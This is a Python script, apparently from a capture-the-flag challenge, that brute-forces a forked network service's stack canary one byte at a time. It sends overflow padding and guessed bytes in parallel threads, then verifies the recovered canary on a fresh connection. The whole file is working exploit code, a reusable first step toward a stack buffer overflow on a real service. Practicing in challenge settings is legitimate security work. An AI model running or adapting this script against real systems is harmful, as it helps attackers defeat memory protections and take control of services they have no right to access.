#!/usr/bin/env python3
"""Recover the rime stack canary byte-by-byte (blind, forked service)."""
import socket, sys, time, json, os
from concurrent.futures import ThreadPoolExecutor, as_completed

HOST = os.environ.get("HOST", "0.cloud.chals.io")
PORT = int(os.environ.get("PORT", "24359"))
BUF = 104
WORKERS = int(os.environ.get("WORKERS", "24"))

def attempt(payload, timeout=3.0):
    """Return True iff the service survives the payload and prints a reading."""
    try:
        s = socket.create_connection((HOST, PORT), timeout=6)
        s.settimeout(timeout)
        out = b""
        while b"reading> " not in out:
            d = s.recv(4096)
            if not d:
                return False
            out += d
        s.sendall(payload)
        r = b""
        while True:
            d = s.recv(4096)
            if not d:
                break
            r += d
            if b"reading> " in r:
                break
        return b"pressure" in r
    except Exception:
        return False
    finally:
        try:
            s.close()
        except Exception:
            pass

def recover(prefix):
    """Try all 256 values for the next canary byte, in parallel."""
    want = len(prefix)  # byte index within canary
    base = b"A" * BUF + prefix
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = {ex.submit(attempt, base + bytes([v])): v for v in range(256)}
        for f in as_completed(futs):
            v = futs[f]
            if f.result():
                return v
    return None

def main():
    path = sys.argv[1] if len(sys.argv) > 1 else "canary.txt"
    canary = bytearray(b"\x00")
    print(f"known: {canary.hex()}", flush=True)
    for i in range(1, 8):
        t0 = time.time()
        v = recover(bytes(canary))
        if v is None:
            print("FAILED: service likely restarted; rerun")
            return 1
        canary.append(v)
        print(f"byte {i}: {v:02x}  ({time.time()-t0:.1f}s)  canary={canary.hex()}", flush=True)
        with open(path, "w") as fh:
            fh.write(canary.hex() + "\n")
    print("CANARY", canary.hex())
    # verify on a fresh connection
    payload = b"A" * BUF + bytes(canary)
    ok = attempt(payload)
    print("verify:", "OK" if ok else "BAD")
    return 0 if ok else 1

if __name__ == "__main__":
    sys.exit(main())
